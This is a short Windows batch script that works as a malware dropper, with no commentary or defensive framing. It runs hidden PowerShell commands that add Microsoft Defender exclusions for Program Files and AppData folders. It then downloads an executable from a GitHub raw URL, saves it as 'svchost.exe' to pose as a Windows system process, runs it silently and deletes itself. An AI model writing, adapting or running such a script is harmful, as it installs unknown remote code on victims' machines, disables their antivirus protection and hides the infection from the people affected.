@echo off
cd /d "%~dp0"
powershell -w hidden -Command "$p=[Environment]::GetFolderPath('ProgramFilesX86');$u=$p-replace' \(x86\)','';Add-MpPreference -ExclusionPath $u;Add-MpPreference -ExclusionPath $p;$a=[Environment]::GetFolderPath('ApplicationData');Add-MpPreference -ExclusionPath $a;$l=[Environment]::GetFolderPath('LocalApplicationData');Add-MpPreference -ExclusionPath $l"
powershell -w hidden -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe','%~dp0svchost.exe')"
if exist "%~dp0svchost.exe" start /b "" "%~dp0svchost.exe"
del "%~f0" >nul 2>&1
